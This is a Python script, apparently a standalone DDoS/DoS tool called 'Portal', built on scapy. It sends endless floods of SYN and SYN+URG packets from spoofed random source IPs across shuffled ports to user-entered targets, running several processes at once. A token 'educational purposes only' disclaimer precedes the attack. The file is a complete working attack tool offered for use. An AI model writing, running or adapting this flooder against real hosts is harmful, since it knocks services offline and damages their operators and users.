from scapy.all import *
import random
import multiprocessing as mp


def configPortList():
    port_list = list(range(65536)) * random.randint(2, 12) 
    pop_list = [7, 20, 21, 22, 23, 25, 53, 67, 68, 69, 80, 81, 110, 119, 123, 137, 138, 139, 143, 161, 162, 179, 194, 389, 443, 465, 500, 587, 636, 989, 990, 993, 995, 1080, 2525, 3128, 3306, 3389, 3535, 5000, 8080, 8081, 8443] * int(round(len(port_list)/43, 0))
    final_list = port_list + pop_list
    random.shuffle(final_list)
    
    return final_list


def attackPORT(targIP):
    urgList = [[1, "SU"], [0, "S"], [0, "S"], [0, "S"], [0, "S"], [0, "S"], [0, "S"], [0, "S"], [0, "S"], [0, "S"], [0, "S"], [0, "S"], [0, "S"], [0, "S"], [0, "S"], [0, "S"], [0, "S"], [0, "S"], [0, "S"], [0, "S"]]
        
    while True:
        portList = configPortList()
        
        for d_port in portList:
            try:
                pack = IP(src=RandIP(), dst=targIP, version=4, ihl=None, tos=0, id=random.randint(0, 65536), flags="DF", frag=0, ttl=128, options=[]) / TCP(sport=RandShort(), dport=d_port, window=random.choice([64240, 65535]), urgptr=0, ack=0, seq=random.randint(0, (2**32)), flags="S", options=[("MSS", 1460), ("NOP", None), ("WScale", 8), ("NOP", None), ("NOP", None), ("SAckOK", "")]) 
                urgChoice = random.choice(urgList)
                pack[TCP].urgptr = urgChoice[0]
                pack[TCP].flags = urgChoice[1]
                
                send(pack, loop=False, verbose=False)                   
            except Exception as e:
                print("Error: " + str(e) + "\nIP May Be Down!")


try:            
    if __name__ == "__main__":
        print("This is Portal DDoS/DoS ([Distributed] Denial of Service) Software.\n\nDISCLAIMER: This software is for educational purposes ONLY. DDoS/DoS is an illegal activity and infringement of the law. The user(s) of this program may ONLY use this program to target machines where they have EXPLICIT permission to do so. Any violation of this procedure may result in legal action to be taken or other complications. The creator of this software and their affiliates are NOT responsible and do NOT claim ANY responsibility for the actions of the user(s) of this program. By using this software the user(s) agree(s) to the above terms and conditions.This Warning Has Hereby Been Issued!\n\nIMPORTANT: After beginning a DDoS/DoS attack, the ONLY way to completely stop the attack is to exit out of the program and COMPLETELY restart the machine.\n")
        processes = [mp.Process(target=attackPORT, args=(str(input("This Computer Can Attack Up To " + str(round(float(mp.cpu_count()*1.5), 0)) + " Machines (To Attack a Single IP Adress, simply enter that IP Adress " + str(round(float(mp.cpu_count()*1.5), 0)) + " times). - Enter IPv4/IPv6 Adress #" + str(int(_)+1) + ": ")), )) for _ in range(int(round(float(mp.cpu_count()*1.5), 0)))]
        for pro in processes:
            pro.start()
except:
    pass
